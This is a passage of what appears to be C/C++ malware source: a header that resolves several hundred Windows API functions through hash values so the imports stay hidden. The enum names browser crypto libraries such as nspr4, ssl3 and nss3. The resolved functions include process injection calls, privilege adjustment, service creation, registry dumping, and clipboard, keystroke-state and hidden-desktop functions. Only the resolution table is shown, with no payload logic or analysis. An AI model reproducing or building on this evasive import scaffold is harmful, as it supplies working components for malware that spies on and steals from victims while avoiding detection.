    DLL_ADVAPI32 = 2,
    DLL_USER32 = 3,
    DLL_WINSOCK = 4,
    DLL_NTDLL = 5,
    DLL_WINSTA = 6,
    DLL_SHELL32 = 7,
    DLL_WININET = 8,
    DLL_URLMON = 9,
    DLL_NSPR4 = 10,
    DLL_SSL3 = 11,
    DLL_WINMM = 12,
    DLL_CABINET = 13,
    DLL_OPERA = 14,
    DLL_GDI = 15,  /* gdi32.dll     */
    DLL_GDIPLUS = 16,  /* gdiplus.dll   */
    DLL_CRYPT32 = 17,  /* crypt32.dll   */
    DLL_PSAPI = 18,  /* psapi.dll     */
    DLL_SHLWAPI = 19,  /* shlwapi.dll   */
    DLL_IPHLPAPI = 20,  /* Iphlpapi.dll  */
    DLL_WINSPOOL = 21,  /* winspool_drv* */
    DLL_COMMDLG32 = 22,  /* commdlg32_dll */
    DLL_ODBC32 = 23,  /* odbc32_dll    */
    DLL_VERSION = 24,  /* version.dll   */
    DLL_OLE32 = 25,  /* ole32.dll     */
    DLL_IMAGEHLP = 26,  /* Imagehlp.dll  */
    DLL_CRYPTDLL = 27,  /* cryptdll.dll  */
    DLL_NSS3 = 28,
};


const static int ApiCacheSize = 569;

//kernel32
#define pLoadLibraryA 				pushargEx< DLL_KERNEL32, 0xC8AC8026, 2 >
#define pLoadLibraryW 				pushargEx< DLL_KERNEL32, 0xC8AC8030, 3 >
#define pLoadLibraryExA 			pushargEx< DLL_KERNEL32, 0x20088E6A, 4 >
#define pLoadLibraryExW 			pushargEx< DLL_KERNEL32, 0x20088E7C, 5 >
#define pFreeLibrary 				pushargEx< DLL_KERNEL32, 0x4B935B8E, 6 >
#define pGetProcAddress 			pushargEx< DLL_KERNEL32, 0x1FC0EAEE, 7 >
#define pTerminateProcess			pushargEx< DLL_KERNEL32, 0x9E6FA842, 8 >
#define pVirtualAlloc 				pushargEx< DLL_KERNEL32, 0x697A6AFE, 9 >
#define pVirtualAllocEx 			pushargEx< DLL_KERNEL32, 0x9ABFB8A6, 10 >
#define pVirtualFree 				pushargEx< DLL_KERNEL32, 0x3A35705F, 11 >
#define pVirtualFreeEx 				pushargEx< DLL_KERNEL32, 0x5C17EC75, 12 >
#define pVirtualQuery 				pushargEx< DLL_KERNEL32, 0x6A582465, 13 >
#define pVirtualQueryEx 			pushargEx< DLL_KERNEL32, 0x919786E, 14 >
#define pVirtualProtect 			pushargEx< DLL_KERNEL32, 0xA9DE6F5A, 15 >
#define pVirtualProtectEx 			pushargEx< DLL_KERNEL32, 0x9BD6888F, 16 >
#define pCloseHandle 				pushargEx< DLL_KERNEL32, 0x723EB0D5, 17 >
#define pGlobalAlloc 				pushargEx< DLL_KERNEL32, 0x725EA171, 18 >
#define pGlobalFree 				pushargEx< DLL_KERNEL32, 0x240339C8, 19 >
#define pCreateFileA 				pushargEx< DLL_KERNEL32, 0x8F8F114, 20 >
#define pCreateFileW 				pushargEx< DLL_KERNEL32, 0x8F8F102, 21 >
#define pWriteFile 					pushargEx< DLL_KERNEL32, 0xF3FD1C3, 22 >
#define pGetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xC80715CE, 23 >
#define pWriteProcessMemory 		pushargEx< DLL_KERNEL32, 0xBEA0BF35, 24 >
#define pCreateRemoteThread 		pushargEx< DLL_KERNEL32, 0xE61874B3, 25 >
#define pReadFile 					pushargEx< DLL_KERNEL32, 0x487FE16B, 26 >
#define pSetFilePointer 			pushargEx< DLL_KERNEL32, 0xEF48E03A, 27 >
#define pSetEndOfFile 				pushargEx< DLL_KERNEL32, 0x2D0D9D61, 28 >
#define pCopyFileA 					pushargEx< DLL_KERNEL32, 0x2EE4F10D, 29 >
#define pCopyFileW 					pushargEx< DLL_KERNEL32, 0x2EE4F11B, 30 >
#define pMoveFileA 					pushargEx< DLL_KERNEL32, 0x20E4E9ED, 31 >
#define pMoveFileW 					pushargEx< DLL_KERNEL32, 0x20E4E9FB, 32 >
#define pMoveFileExA 				pushargEx< DLL_KERNEL32, 0x3A7A7478, 33 >
#define pMoveFileExW 				pushargEx< DLL_KERNEL32, 0x3A7A746E, 34 >
#define pDeleteFileA 				pushargEx< DLL_KERNEL32, 0x81F0F0DF, 35 >
#define pDeleteFileW 				pushargEx< DLL_KERNEL32, 0x81F0F0C9, 36 >
#define pGetFileSize 				pushargEx< DLL_KERNEL32, 0xAEF7CBF1, 37 >
#define pCreateFileMappingA 		pushargEx< DLL_KERNEL32, 0xEF0A25B7, 38 >
#define pCreateFileMappingW 		pushargEx< DLL_KERNEL32, 0xEF0A25A1, 39 >
#define pMapViewOfFile 				pushargEx< DLL_KERNEL32, 0x5CD9430, 40 >
#define pGetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C071, 41 >
#define pSetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C571, 42 >
#define pGetModuleHandleA 			pushargEx< DLL_KERNEL32, 0xA48D6762, 43 >
#define pGetModuleHandleW 			pushargEx< DLL_KERNEL32, 0xA48D6774, 44 >
#define pUnmapViewOfFile 			pushargEx< DLL_KERNEL32, 0x77CD9567, 45 >
#define pWaitForSingleObject 		pushargEx< DLL_KERNEL32, 0xC54374F3, 46 >
#define pSleep 						pushargEx< DLL_KERNEL32, 0x3D9972F5, 47 >
#define pWideCharToMultiByte 		pushargEx< DLL_KERNEL32, 0xE74F57EE, 48 >
#define pMultiByteToWideChar 		pushargEx< DLL_KERNEL32, 0x5AA7E70B, 49 >
#define pGetModuleFileNameA 		pushargEx< DLL_KERNEL32, 0x774393E8, 50 >
#define pGetModuleFileNameW 		pushargEx< DLL_KERNEL32, 0x774393FE, 51 >
#define pGetSystemDirectoryA 		pushargEx< DLL_KERNEL32, 0x49A1374A, 52 >
#define pGetSystemDirectoryW 		pushargEx< DLL_KERNEL32, 0x49A1375C, 53 >
#define pGetTempPathA 				pushargEx< DLL_KERNEL32, 0x58FE7ABE, 54 >
#define pGetTempPathW 				pushargEx< DLL_KERNEL32, 0x58FE7AA8, 55 >
#define pGetVolumeInformationA 		pushargEx< DLL_KERNEL32, 0x67ECDE97, 56 >
#define pGetVolumeInformationW 		pushargEx< DLL_KERNEL32, 0x67ECDE81, 57 >
#define pSetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x4D5587B7, 58 >
#define pSetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x4D5587A1, 59 >
#define pCreateProcessA 			pushargEx< DLL_KERNEL32, 0x46318AC7, 60 >
#define pCreateProcessW 			pushargEx< DLL_KERNEL32, 0x46318AD1, 61 >
#define pGetVersionExA 				pushargEx< DLL_KERNEL32, 0x9C480E24, 62 >
#define pGetVersionExW 				pushargEx< DLL_KERNEL32, 0x9C480E32, 63 >
#define pCreateThread 				pushargEx< DLL_KERNEL32, 0x6FB89AF0, 64 >
#define pSetThreadPriority			pushargEx< DLL_KERNEL32, 0xBC262395, 65 >
#define pCreateMutexA 				pushargEx< DLL_KERNEL32, 0xBF78969C, 66 >
#define pCreateMutexW 				pushargEx< DLL_KERNEL32, 0xBF78968A, 67 >
#define pReleaseMutex 				pushargEx< DLL_KERNEL32, 0xBB74A4A2, 68 >
#define pGetVersion 				pushargEx< DLL_KERNEL32, 0xCB932CE2, 69 >
#define pDeviceIoControl 			pushargEx< DLL_KERNEL32, 0x82E8173, 70 >
#define pQueryDosDeviceA 			pushargEx< DLL_KERNEL32, 0xAC81BECB, 71 >
#define pQueryDosDeviceW 			pushargEx< DLL_KERNEL32, 0xAC81BEDD, 72 >
#define pIsBadReadPtr 				pushargEx< DLL_KERNEL32, 0x7D544DBD, 73 >
#define pIsBadWritePtr 				pushargEx< DLL_KERNEL32, 0xAC85818D, 74 >
#define pGetCurrentProcess 			pushargEx< DLL_KERNEL32, 0xD89AD05, 75 >
#define pCreateEventW 				pushargEx< DLL_KERNEL32, 0x8D5A50CA, 76 >
#define pSetEvent 					pushargEx< DLL_KERNEL32, 0x5E7EE0D0, 77 >
#define pResetEvent 				pushargEx< DLL_KERNEL32, 0x3B3EE0F9, 78 >
#define pGetShortPathNameA 			pushargEx< DLL_KERNEL32, 0x223296ED, 79 >
#define pGetShortPathNameW 			pushargEx< DLL_KERNEL32, 0x223296FB, 80 >
#define pLocalFree 					pushargEx< DLL_KERNEL32, 0x84033DEB, 81 >
#define pGetPrivateProfileStringA 	pushargEx< DLL_KERNEL32, 0xAA19E291, 82 >
#define pGetPrivateProfileStringW 	pushargEx< DLL_KERNEL32, 0xAA19E287, 83 >
#define pGetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x475587B7, 84 >
#define pGetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x475587A1, 85 >
#define pGetEnvironmentVariableA 	pushargEx< DLL_KERNEL32, 0x9802EF30, 86 >
#define pGetEnvironmentVariableW 	pushargEx< DLL_KERNEL32, 0x9802EF26, 87 >
#define pReadProcessMemory 			pushargEx< DLL_KERNEL32, 0x9D00A761, 88 >
#define pExitProcess 				pushargEx< DLL_KERNEL32, 0x95902B19, 89 >
#define pOpenProcess 				pushargEx< DLL_KERNEL32, 0x99A4299D, 90 >
#define pGetCurrentProcessId		pushargEx< DLL_KERNEL32, 0x6B416786, 91 >
#define pProcess32First 			pushargEx< DLL_KERNEL32, 0x19F78C90, 92 >
#define pProcess32Next 				pushargEx< DLL_KERNEL32, 0xC930EA1E, 93 >
#define pCreateToolhelp32Snapshot	pushargEx< DLL_KERNEL32, 0x5BC1D14F, 94 >
#define pWinExec 					pushargEx< DLL_KERNEL32, 0xE8BF6DAD, 95 >
#define pFindResourceA 				pushargEx< DLL_KERNEL32, 0x8FE060C, 96 >
#define pSetLastError 				pushargEx< DLL_KERNEL32, 0x1295012C, 97 >
#define pLoadResource 				pushargEx< DLL_KERNEL32, 0x1A10BD8B, 98 >
#define pLockResource 				pushargEx< DLL_KERNEL32, 0x1510BD8A, 99 >
#define pSizeofResource 			pushargEx< DLL_KERNEL32, 0x86867F0E, 100 >
#define pLockRsrc 					pushargEx< DLL_KERNEL32, 0xBAC5467D, 101 >
#define pGetTempFileNameA 			pushargEx< DLL_KERNEL32, 0xFA4F502, 102 >
#define pGetTempFileNameW 			pushargEx< DLL_KERNEL32, 0xFA4F514, 103 >
#define pGetLongPathNameA 			pushargEx< DLL_KERNEL32, 0x9835D5A1, 104 >
#define pCreateEventA				pushargEx< DLL_KERNEL32, 0x8D5A50DC, 105 >
#define pConnectNamedPipe			pushargEx< DLL_KERNEL32, 0x7235F00E, 106 >
#define pDisconnectNamedPipe   		pushargEx< DLL_KERNEL32, 0x46C6B01F, 107 >
#define pCreateNamedPipeA			pushargEx< DLL_KERNEL32, 0x42F9BB48, 108 >
#define pGetTickCount				pushargEx< DLL_KERNEL32, 0x69260152, 109 >
#define pExitThread					pushargEx< DLL_KERNEL32, 0x768AA260, 110 >
#define plstrcmpiA					pushargEx< DLL_KERNEL32, 0x515BE757, 111 >
#define pSuspendThread				pushargEx< DLL_KERNEL32, 0xEEBA5EBA, 112 >
#define pGetComputerNameA			pushargEx< DLL_KERNEL32, 0x3DEF91BA, 113 >
#define pGetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DE02F, 114 >
#define pSetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DC82F, 115 >
#define pResumeThread				pushargEx< DLL_KERNEL32, 0x7B88BF3B, 116 >
#define pProcessIdToSessionId		pushargEx< DLL_KERNEL32, 0x654F3F9E, 117 >
#define	pWTSGetActiveConsoleSessionId	pushargEx< DLL_KERNEL32, 0x654FEEAC, 118 >
#define pOpenMutexA					pushargEx< DLL_KERNEL32, 0xAE52C609, 119 >
#define pCreateProcessInternalA		pushargEx< DLL_KERNEL32, 0xE24394E4, 120 >
#define pCreateProcessInternalW		pushargEx< DLL_KERNEL32, 0xE24394F2, 121 >
#define pTerminateThread			pushargEx< DLL_KERNEL32, 0xC09D5D66, 122 >
#define plopen						pushargEx< DLL_KERNEL32, 0xCDFC3010, 123 >
#define plstrcmpA					pushargEx< DLL_KERNEL32, 0x2CA2B7E6, 124 >
#define plstrcmpW					pushargEx< DLL_KERNEL32, 0x2CA2B7F0, 125 >
#define plstrcatA					pushargEx< DLL_KERNEL32, 0x2CA1B5E6, 126 >
#define plstrcatW					pushargEx< DLL_KERNEL32, 0x2CA1B5F0, 127 >
#define plstrcpyA					pushargEx< DLL_KERNEL32, 0x2CA5F366, 128 >
#define plstrcpyW					pushargEx< DLL_KERNEL32, 0x2CA5F370, 129 >
#define plstrlenA					pushargEx< DLL_KERNEL32, 0x2D40B8E6, 130 >
#define plstrlenW					pushargEx< DLL_KERNEL32, 0x2D40B8F0, 131 >
#define pThread32First				pushargEx< DLL_KERNEL32, 0x89B968D2, 132 >
#define pThread32Next				pushargEx< DLL_KERNEL32, 0x4C1077D6, 133 >
#define pOpenThread					pushargEx< DLL_KERNEL32, 0x7E92CA65, 134 >
#define pGetWindowsDirectoryA		pushargEx< DLL_KERNEL32, 0x78B00C7E, 135 >
#define pGetWindowsDirectoryW		pushargEx< DLL_KERNEL32, 0x78B00C68, 136 >
#define pFindFirstFileA				pushargEx< DLL_KERNEL32, 0x32432444, 137 >
#define pFindFirstFileW				pushargEx< DLL_KERNEL32, 0x32432452, 138 >
#define pFindNextFileA				pushargEx< DLL_KERNEL32, 0x279DEAD7, 139 >
#define pFindNextFileW				pushargEx< DLL_KERNEL32, 0x279DEAC1, 140 >
#define pFindClose  				pushargEx< DLL_KERNEL32, 0x7B4842C1, 141 >
#define pRemoveDirectoryA			pushargEx< DLL_KERNEL32, 0x4AE7572B, 142 >
#define pInitializeCriticalSection	pushargEx< DLL_KERNEL32, 0xDA81BC58, 143 >
#define pEnterCriticalSection		pushargEx< DLL_KERNEL32, 0xF3B84F05, 144 >
#define pLeaveCriticalSection		pushargEx< DLL_KERNEL32, 0x392B6027, 145 >
#define pDeleteCriticalSection		pushargEx< DLL_KERNEL32, 0x7B2D2505, 146 >
#define pGetProcessHeap				pushargEx< DLL_KERNEL32, 0x68807354, 147 >
#define pHeapAlloc					pushargEx< DLL_KERNEL32, 0x5550B067, 148 >
#define pHeapReAlloc				pushargEx< DLL_KERNEL32, 0xFC7A6EFD, 149 >
#define pHeapSize					pushargEx< DLL_KERNEL32, 0x0AEBEA6A, 150 >
#define pHeapFree					pushargEx< DLL_KERNEL32, 0x084D25EA, 151 >
#define pGetCurrentThreadId			pushargEx< DLL_KERNEL32, 0xA45B370A, 152 >
#define pGetCurrentThread   		pushargEx< DLL_KERNEL32, 0x4FBA916C, 153 >
#define	pGlobalLock					pushargEx< DLL_KERNEL32, 0x25447AC6, 154 >
#define	pGlobalUnlock				pushargEx< DLL_KERNEL32, 0xF50B872, 155 >
#define pSetErrorMode				pushargEx< DLL_KERNEL32, 0x6C544060, 156 >
#define pGetFileInformationByHandle pushargEx< DLL_KERNEL32, 0xF149BCC4, 157 >
#define pFileTimeToLocalFileTime	pushargEx< DLL_KERNEL32, 0xE5792E94, 158 >
#define pFileTimeToDosDateTime		pushargEx< DLL_KERNEL32, 0xB68EBEF8, 159 >
#define pOutputDebugStringA			pushargEx< DLL_KERNEL32, 0xD0498CD4, 160 >
#define pExpandEnvironmentStringsA	pushargEx< DLL_KERNEL32, 0x23EBE98B, 161 >
#define pExpandEnvironmentStringsW	pushargEx< DLL_KERNEL32, 0x23EBE99D, 162 >
#define pOutputDebugStringW			pushargEx< DLL_KERNEL32, 0xD0498CC2, 163 >
#define pLocalAlloc 				pushargEx< DLL_KERNEL32, 0x725CB0A1, 164 >
#define pFindFirstChangeNotificationA pushargEx< DLL_KERNEL32, 0xE8402F0, 165 >
#define pFindCloseChangeNotification  pushargEx< DLL_KERNEL32, 0x3634D801, 166 >
#define pFindNextChangeNotification   pushargEx< DLL_KERNEL32, 0xFAB3FE71, 167 >
#define pCreateDirectoryW			  pushargEx< DLL_KERNEL32, 0xA073561, 168 >
#define pCreateDirectoryA		    pushargEx< DLL_KERNEL32, 0xA073577, 169 >
#define pOpenEventW					pushargEx< DLL_KERNEL32, 0x9C70005F, 170 >
#define pGetSystemTimeAsFileTime	pushargEx< DLL_KERNEL32, 0x6951E92A, 171 >
#define pGetSystemTime 				pushargEx< DLL_KERNEL32, 0x270118E2, 172 >
#define pFileTimeToSystemTime		pushargEx< DLL_KERNEL32, 0x3B429F5F, 173 >
#define pCompareFileTime			pushargEx< DLL_KERNEL32, 0x41C9C8F5, 174 >
#define pSystemTimeToFileTime		pushargEx< DLL_KERNEL32, 0xEA7EA921, 175 >
#define pGetLogicalDriveStringsA  	pushargEx< DLL_KERNEL32, 0x70F6FE31, 176 >
#define pGetDriveTypeA          	pushargEx< DLL_KERNEL32, 0x399354CE, 177 >
#define pSleepEx				 	pushargEx< DLL_KERNEL32, 0x5CBD6D9E, 178 >
#define pGetProcessId				pushargEx< DLL_KERNEL32, 0x0e91a280, 179 >
#define pOpenEventA					pushargEx< DLL_KERNEL32, 0x9C700049, 180 >
#define pSetCurrentDirectoryW		pushargEx< DLL_KERNEL32, 0xc8071758, 181 >
#define pSetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xc807174e, 182 >
#define pDuplicateHandle			pushargEx< DLL_KERNEL32, 0x533d3b41, 183 >
#define pGetExitCodeThread			pushargEx< DLL_KERNEL32, 0x4E5A10B1, 184 >
#define pGetCommandLineA			pushargEx< DLL_KERNEL32, 0xFB0730C, 185 >
#define pGetPrivateProfileIntA		pushargEx< DLL_KERNEL32, 0x11CC0678, 186 >
#define pProcess32FirstW 			pushargEx< DLL_KERNEL32, 0xFBC6485B, 187 >
#define pProcess32NextW				pushargEx< DLL_KERNEL32, 0x98750F33, 188 >
#define pGetLogicalDrives			pushargEx< DLL_KERNEL32, 0x6A3376B7, 189 >
#define pInterlockedIncrement		pushargEx< DLL_KERNEL32, 0xD03C6D18, 190 >
#define pInterlockedDecrement		pushargEx< DLL_KERNEL32, 0xDD2A6D18, 191 >
#define pFlushViewOfFile			pushargEx< DLL_KERNEL32, 0x664FD32B, 192 >
#define pGetExitCodeProcess			pushargEx< DLL_KERNEL32, 0xFDC94385, 193 >
#define pFlushFileBuffers			pushargEx< DLL_KERNEL32, 0x2f2feeda, 194 >	
#define pGetStartupInfoA			pushargEx< DLL_KERNEL32, 0x407A1C6A, 195 >
#define _pGetLastError    			pushargEx< DLL_KERNEL32, 0x1297812C, 196 >
#define pWritePrivateProfileStringA	pushargEx< DLL_KERNEL32, 0xEEBA10CD, 197 >
#define pIsWow64Process             pushargEx< DLL_KERNEL32, 0x52AC19C,  198 >
#define pGetNativeSystemInfo        pushargEx< DLL_KERNEL32, 0x74B624BE, 199 >


//advapi32
//advapi32
#define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4, 200 >
#define pSetThreadToken				pushargEx< DLL_ADVAPI32, 0xA16FE0FD, 201 >
#define pOpenProcessToken 			pushargEx< DLL_ADVAPI32, 0x80DBBE07, 202 >
#define pLookupPrivilegeValueA 		pushargEx< DLL_ADVAPI32, 0x1B3D12B9, 203 >
#define pLookupPrivilegeValueW 		pushargEx< DLL_ADVAPI32, 0x1B3D12AF, 204 >
#define pAdjustTokenPrivileges 		pushargEx< DLL_ADVAPI32, 0x7A2167DC, 205 >
#define pRegOpenKeyExA 				pushargEx< DLL_ADVAPI32, 0xAAD67FF8, 206 >
#define pRegOpenKeyExW 				pushargEx< DLL_ADVAPI32, 0xAAD67FEE, 207 >
#define pRegQueryInfoKeyA 			pushargEx< DLL_ADVAPI32, 0xBDF4DB19, 208 >
#define pRegQueryInfoKeyW 			pushargEx< DLL_ADVAPI32, 0xBDF4DB0F, 209 >
#define pRegEnumKeyExA 				pushargEx< DLL_ADVAPI32, 0xB4F673FD, 210 >
#define pRegEnumKeyExW 				pushargEx< DLL_ADVAPI32, 0xB4F673EB, 211 >
#define pRegEnumValueA 				pushargEx< DLL_ADVAPI32, 0xF65A7D95, 212 >
#define pRegEnumValueW 				pushargEx< DLL_ADVAPI32, 0xF65A7D83, 213 >
#define pRegQueryValueExA 			pushargEx< DLL_ADVAPI32, 0x1802E7C8, 214 >
#define pRegQueryValueExW 			pushargEx< DLL_ADVAPI32, 0x1802E7DE, 215 >
#define pRegCloseKey 				pushargEx< DLL_ADVAPI32, 0xDB355534, 216 >
#define pRegDeleteKeyA 				pushargEx< DLL_ADVAPI32, 0x398C5285, 217 >
#define pRegDeleteKeyW 				pushargEx< DLL_ADVAPI32, 0x398C5293, 218 >
#define pRegSetValueExA 			pushargEx< DLL_ADVAPI32, 0x3E400FD6, 219 >
#define pRegSetValueExW 			pushargEx< DLL_ADVAPI32, 0x3E400FC0, 220 >
#define pGetUserNameA 				pushargEx< DLL_ADVAPI32, 0xB9D41C2F, 221 >
#define pGetUserNameW 				pushargEx< DLL_ADVAPI32, 0xB9D41C39, 222 >
#define pCreateServiceA 			pushargEx< DLL_ADVAPI32, 0x17B3DD2E, 223 >
#define pOpenServiceA 				pushargEx< DLL_ADVAPI32, 0x83969964, 224 >
#define pDeleteService 				pushargEx< DLL_ADVAPI32, 0xDE5D85F8, 225 >
#define pStartServiceA 				pushargEx< DLL_ADVAPI32, 0x1CA1FD2F, 226 >
#define pGetKernelObjectSecurity 	pushargEx< DLL_ADVAPI32, 0xB29136DD, 227 >
#define pOpenSCManagerA 			pushargEx< DLL_ADVAPI32, 0xA06E459C, 228 >
#define pGetCurrentHwProfileA		pushargEx< DLL_ADVAPI32, 0xF684C7A9, 229 >
#define pGetTokenInformation		pushargEx< DLL_ADVAPI32, 0xD4ECC759, 230 >
#define pInitializeSecurityDescriptor	pushargEx< DLL_ADVAPI32, 0xB8538A52, 231 >
#define pSetSecurityDescriptorOwner	pushargEx< DLL_ADVAPI32, 0xDADD5994, 232 >
#define pSetSecurityDescriptorDacl	pushargEx< DLL_ADVAPI32,0xCCD03C3A, 233 >
#define pSetFileSecurityW			pushargEx< DLL_ADVAPI32, 0x5A9B2FDD, 234 >
#define pRegCreateKeyW				pushargEx< DLL_ADVAPI32, 0xAE9E4290, 235 >
#define pRegCreateKeyA				pushargEx< DLL_ADVAPI32, 0xAE9E4286, 236 >
#define pRegCreateKeyExW			pushargEx< DLL_ADVAPI32, 0x90A097F0, 237 >
#define pRegCreateKeyExA			pushargEx< DLL_ADVAPI32, 0x90A097E6, 238 >
#define pRegSaveKeyA				pushargEx< DLL_ADVAPI32, 0xBEDEEFC5, 239 >
#define pRegSaveKeyW				pushargEx< DLL_ADVAPI32, 0xBEDEEFD3, 240 >
#define pRegSaveKeyExA				pushargEx< DLL_ADVAPI32, 0xBBF053F6, 241 >
#define pRegSaveKeyExW				pushargEx< DLL_ADVAPI32, 0xBBF053E0, 242 >
#define pCryptAcquireContextA		pushargEx< DLL_ADVAPI32, 0x8AD7DE34, 243 >
#define pCryptReleaseContext		pushargEx< DLL_ADVAPI32, 0x72760BB8, 244 >
#define pCryptCreateHash            pushargEx< DLL_ADVAPI32, 0x3C4DE260, 245>
#define pCryptGenKey                pushargEx< DLL_ADVAPI32, 0x2433303E, 246>
#define pCryptDeriveKey             pushargEx< DLL_ADVAPI32, 0x3756058E, 247>
#define pCryptDestroyHash           pushargEx< DLL_ADVAPI32, 0xA5FFA46E, 248>
#define pCryptHashData              pushargEx< DLL_ADVAPI32, 0xF837A387, 249>

#define pCryptImportKey     		pushargEx< DLL_ADVAPI32, 0x78660DBE, 250 >
#define pCryptEncrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF13BE, 251 >
#define pCryptDecrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF17E6, 252 >
#define pCryptSetKeyParam   		pushargEx< DLL_ADVAPI32, 0x37A53419, 253 >
#define pCryptDestroyKey    		pushargEx< DLL_ADVAPI32, 0xD4B3D42, 254 >
#define pControlService				pushargEx< DLL_ADVAPI32, 0x5FFEE3F1, 255 >
#define pQueryServiceStatus		    pushargEx< DLL_ADVAPI32, 0xC033DB1C, 256 >
#define pSetServiceStatus		    pushargEx< DLL_ADVAPI32, 0x80C6B740, 257 >
#define pRegisterServiceCtrlHandlerA   pushargEx< DLL_ADVAPI32, 0x16B6D72E, 258 >
#define pStartServiceCtrlDispatcherA   pushargEx< DLL_ADVAPI32, 0x1B529B64, 259 >
#define pQueryServiceStatusEx		pushargEx< DLL_ADVAPI32, 0xF6C712F4, 260 >
#define pRegDeleteValueA			pushargEx< DLL_ADVAPI32, 0x560c7c4a, 261 >
#define pCloseServiceHandle			pushargEx< DLL_ADVAPI32, 0x78CEC357, 262 >
#define pAllocateAndInitializeSid	pushargEx< DLL_ADVAPI32, 0x28E9E291, 263 >
#define pCheckTokenMembership		pushargEx< DLL_ADVAPI32, 0x87FEDB50, 264 >
#define pFreeSid					pushargEx< DLL_ADVAPI32, 0x5CB5EF72, 265 >

//user32
#define pExitWindowsEx 				pushargEx< DLL_USER32, 0xAD7043A4, 266 >
#define pPeekMessageW 				pushargEx< DLL_USER32, 0xD7A87C3A, 267 >
#define pDispatchMessageW 			pushargEx< DLL_USER32, 0x4BAED1DE, 268 >
#define pMsgWaitForMultipleObjects 	pushargEx< DLL_USER32, 0xD36CEAF0, 269 >
#define pWaitForInputIdle			pushargEx< DLL_USER32, 0x4FAC81B4, 270 >
#define pGetWindowThreadProcessId	pushargEx< DLL_USER32, 0x6C7F716F, 271 >
#define pFindWindowA				pushargEx< DLL_USER32, 0x252B53B, 272 >
#define pGetSystemMetrics			pushargEx< DLL_USER32, 0x8EBEF5B1, 273 >
#define pGetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98AC, 274 >
#define pGetKeyboardLayoutNameA		pushargEx< DLL_USER32, 0xEA0FAD78, 275 >
#define pOpenClipboard				pushargEx< DLL_USER32, 0x6ADFC795, 276 >
#define pGetClipboardData			pushargEx< DLL_USER32, 0x8E7AE818, 277 >
#define pCloseClipboard				pushargEx< DLL_USER32, 0xF0EC2212, 278 >
#define pGetWindowTextA				pushargEx< DLL_USER32, 0x9C29100A, 279 >
#define pGetWindowTextW				pushargEx< DLL_USER32, 0x9C29101C, 280 >
#define pGetForegroundWindow		pushargEx< DLL_USER32, 0xCACD450, 281 >
#define pGetWindowLongPtrA			pushargEx< DLL_USER32, 0x1D6C998B, 282 >
#define pGetWindowLongPtrW			pushargEx< DLL_USER32, 0x1D6C999D, 283 >
#define pEnumChildWindows			pushargEx< DLL_USER32, 0xAE8A5532, 284 >
#define pGetParent					pushargEx< DLL_USER32, 0x5992A5F2, 285 >
#define pGetDesktopWindow			pushargEx< DLL_USER32, 0xCD4AC62B, 286 >
#define pIsWindowVisible			pushargEx< DLL_USER32, 0xCFAAD7BF, 287 >
#define pIsWindowUnicode            pushargEx< DLL_USER32, 0x6EE99F86, 288 >
#define pSetWindowLongA				pushargEx< DLL_USER32, 0xBD6C998B, 289 >
#define pSetWindowLongW				pushargEx< DLL_USER32, 0xBD6C999D, 290 >
#define pGetWindowLongA				pushargEx< DLL_USER32, 0x1D6C998B, 291 >
#define pGetWindowLongW				pushargEx< DLL_USER32, 0x1D6C999D, 292 >
#define pSetLayeredWindowAttributes	pushargEx< DLL_USER32, 0x2DDBD2AF, 293 >
#define pSetWindowPos				pushargEx< DLL_USER32, 0xA92DF5AF, 294 >
#define pMessageBoxA				pushargEx< DLL_USER32, 0xABBC680D, 295 >
#define pMessageBoxW				pushargEx< DLL_USER32, 0xABBC681B, 296 >
#define pGetClassNameW				pushargEx< DLL_USER32, 0x484006A, 297 >
#define pGetClassNameA				pushargEx< DLL_USER32, 0x484007C, 298 >
#define pShowWindow					pushargEx< DLL_USER32, 0x7506E960, 299 >
#define pSendMessageW				pushargEx< DLL_USER32, 0x58A81C3F, 300 >
#define pSendMessageA				pushargEx< DLL_USER32, 0x58A81C29, 301 >
#define pEnumWindows				pushargEx< DLL_USER32, 0x9940B5CA, 302 >
#define pIsWindow					pushargEx< DLL_USER32, 0x9D4AF949, 303 >
#define pGetWindow					pushargEx< DLL_USER32, 0xDA12E549, 304 >
#define pCreateDesktopW				pushargEx< DLL_USER32, 0xC43ED7B1, 305 >
#define pCreateDesktopA				pushargEx< DLL_USER32, 0xC43ED7A7, 306 >
#define pGetThreadDesktop			pushargEx< DLL_USER32, 0x79F9B7FA, 307 >
#define pSwitchDesktop				pushargEx< DLL_USER32, 0x5B92DEA5, 308 >
#define pSetThreadDesktop			pushargEx< DLL_USER32, 0x79F99FFA, 309 >
#define pGetTopWindow				pushargEx< DLL_USER32, 0xC90E0C33, 310 >
#define pMoveWindow					pushargEx< DLL_USER32, 0x7234A16F, 311 >
#define pFindWindowExA				pushargEx< DLL_USER32, 0xAD4FFCD5, 312 >
#define pGetMessageA				pushargEx< DLL_USER32, 0xC8A274AC, 313 >
#define pSendMessageTimeoutW		pushargEx< DLL_USER32, 0x65846C69, 314 >
#define pSendMessageTimeoutA 		pushargEx< DLL_USER32, 0x65846C7F, 315 >
#define pSetClipboardViewer			pushargEx< DLL_USER32, 0x322391FC, 316 >
#define pIsClipboardFormatAvailable	pushargEx< DLL_USER32, 0xB161BF96, 317 >
#define pChangeClipboardChain   	pushargEx< DLL_USER32, 0x7CF84417, 318 >
#define pPostMessageA				pushargEx< DLL_USER32, 0xC8A87EA7, 319 >
#define pGetMessagePos 				pushargEx< DLL_USER32, 0x9D2F45DB, 320 >
#define pClientToScreen 			pushargEx< DLL_USER32, 0x543DF505, 321 >
#define pGetWindowRect  			pushargEx< DLL_USER32, 0x97F85FA0, 322 >
#define pDefWindowProcA 			pushargEx< DLL_USER32, 0xC6CE9B8A, 323 >
#define pCallWindowProcA 			pushargEx< DLL_USER32, 0xEE5FDA87, 324 >
#define pGetKeyNameTextW 			pushargEx< DLL_USER32, 0xAD34F519, 325 >
#define pGetKeyboardState			pushargEx< DLL_USER32, 0xF5E780A6, 326 >
